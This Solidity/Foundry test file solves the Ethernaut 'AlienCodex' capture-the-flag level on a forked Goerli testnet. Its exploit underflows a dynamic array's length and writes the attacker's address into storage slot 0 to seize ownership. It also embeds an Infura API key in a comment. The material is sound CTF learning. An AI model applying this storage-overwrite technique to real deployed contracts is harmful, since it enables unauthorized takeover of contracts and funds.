//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.18;

// solhint-disable no-global-import
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";
import "@openzeppelin/contracts/utils/Strings.sol";

import "contracts/0_Ethernaut/Ethernaut.sol";
import "contracts/19_AlienCodex/AlienCodex.sol";

// 📘 Forking mainnet: https://book.getfoundry.sh/tutorials/forking-mainnet-with-cast-anvil
// Test execution script for all the test suite:
// ✍ forge test -vvv --fork-url https://goerli.infura.io/v3/8e1f250baaa642a7a64481372e3ae2cb --match-contract AlienCodex
// example of submitting instance: https://goerli.etherscan.io/tx/0x32d74fbac3781218e96365dfb3e234536386ca3e856a4eb7427457ebf566a472
//
// solhint-disable func-name-mixedcase
// solhint-disable no-console
contract AlienCodexTest is Test {
    // 📘 Addresses in Goerli
    address public ethernautHandler = 0xD2e5e0102E55a5234379DD796b8c641cd5996Efd;
    Ethernaut public ethernaut = Ethernaut(ethernautHandler);

    // 👿 Hacker address
    address payable public pedro = payable(0xd299d4C11A1FA966a2E97B89e03DA42029c61152);

    // 📘 Contract address to be hacked
    address public levelInstance;

    // Setup
    function setUp() public {
        // 🟢 Start prank
        vm.startPrank(pedro);

        // 🟢 Record logs
        vm.recordLogs();

        // 🟢 Create level instance
        address levelAddress = 0xd8d8184a9F930F8B0F7AD48F14c7437c12fADF96;
        ethernaut.createLevelInstance(levelAddress);

        // 🟢 Get instance address
        // Notice that your entries are <Interface>.Log[]
        // as opposed to <instance>.Log[]
        Vm.Log[] memory entries = vm.getRecordedLogs();

        // Logging the entries
        console.log("Entries: %s", entries.length);
        console.log("Topics: %s", entries[0].topics.length);
        console.log("Player: %s", address((uint160(uint256(entries[0].topics[1])))));
        console.log("Level Instance: %s", address((uint160(uint256(entries[0].topics[2])))));
        console.log("Level address: %s", address((uint160(uint256(entries[0].topics[3])))));

        // Storing the level instance
        levelInstance = address((uint160(uint256(entries[0].topics[2]))));

        // 🔴 Stop prank
        vm.stopPrank();
    }

    function executeHack() internal returns (bool) {
        // 📘 Contract address
        address alienCodexAddress = levelInstance;

        // 📘 Contract instnace
        AlienCodex alienCodex = AlienCodex(alienCodexAddress); //Instance of AlienCodex contract

        // =============================
        // 👿 Hack
        // =============================
        alienCodex.makeContact(); //Pass modifier
        alienCodex.retract(); //Underflows array, take control of storage

        //Slot where array storage starts
        uint256 startArrayIndex = uint256(keccak256(abi.encode(1)));
        uint256 ownerArrayIndex; //The index that overrides slot 0

        //Disable checked math (ignore underflow error)
        unchecked {
            //Calculate index
            ownerArrayIndex = ((2 ** 256) - 1) - startArrayIndex + 1;
        }

        //Update slot 0 to our address
        alienCodex.revise(ownerArrayIndex, bytes32(uint256(uint160(address(pedro)))));

        console.log("Alien Codex start position: %s", startArrayIndex);
        console.log("Alien Codex owner index: %s", ownerArrayIndex);

        return true;
    }

    // 📖 Test
    function test_Hack() public {
        // 🟢 Start prank
        vm.startPrank(pedro);

        // 🟢 Execute the hack
        bool success = executeHack();

        // 🟢 Verify the hack
        if (success) {
            verifySolution();
        }

        // 🔴 Stop prank
        vm.stopPrank();
    }

    function verifySolution() internal {
        // =============================
        // ✅ Verify the hack
        // =============================
        ethernaut.submitLevelInstance(payable(address(levelInstance)));

        (address player, address level, bool completed) = ethernaut.emittedInstances(address(levelInstance));

        console.log("Player: %s", player);
        console.log("Completed: %s", completed);

        assertEq(completed, true);
    }
}
